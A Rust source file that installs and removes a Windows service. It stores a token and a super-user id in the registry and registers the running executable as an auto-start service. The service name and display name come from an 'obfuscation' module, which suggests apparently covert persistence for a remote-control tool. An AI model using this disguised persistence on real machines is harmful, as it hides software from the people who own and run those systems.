use anyhow::{Context, Result};
use windows_service::service::{
    ServiceAccess, ServiceErrorControl, ServiceInfo, ServiceStartType, ServiceType,
};
use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};

use crate::security::obfuscation;

pub fn install(token: &str, super_user_id: i64) -> Result<()> {
    super::config::save_to_registry(token, super_user_id)?;

    let manager =
        ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CREATE_SERVICE)
            .context("cannot open SCM")?;

    let service_name = obfuscation::service_name();
    let display_name = obfuscation::service_display();

    let exe_path = std::env::current_exe().context("cannot get exe path")?;

    let service_info = ServiceInfo {
        name: service_name.into(),
        display_name: display_name.into(),
        service_type: ServiceType::OWN_PROCESS,
        start_type: ServiceStartType::AutoStart,
        error_control: ServiceErrorControl::Normal,
        executable_path: exe_path,
        launch_arguments: vec![],
        dependencies: vec![],
        account_name: None,
        account_password: None,
    };

    let service = manager
        .create_service(&service_info, ServiceAccess::CHANGE_CONFIG)
        .context("cannot create service")?;

    service
        .set_failure_actions_on_non_crash_failures(true)
        .context("cannot set failure actions")?;

    log::info!("Service installed successfully");
    Ok(())
}

pub fn uninstall() -> Result<()> {
    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
        .context("cannot open SCM")?;

    let service_name = obfuscation::service_name();
    let service = manager
        .open_service(service_name, ServiceAccess::DELETE | ServiceAccess::STOP)
        .context("cannot open service")?;

    let _ = service.stop();

    service.delete().context("cannot delete service")?;
    log::info!("Service uninstalled successfully");
    Ok(())
}
